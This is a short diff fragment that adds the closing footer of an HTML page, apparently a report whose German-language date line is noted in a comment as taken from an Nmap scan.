+        <p>Berichtsdatum: 18. Oktober 2022</p> <!-- Datum aus Nmap Scan -->
+    </footer>
+</body>
+</html>
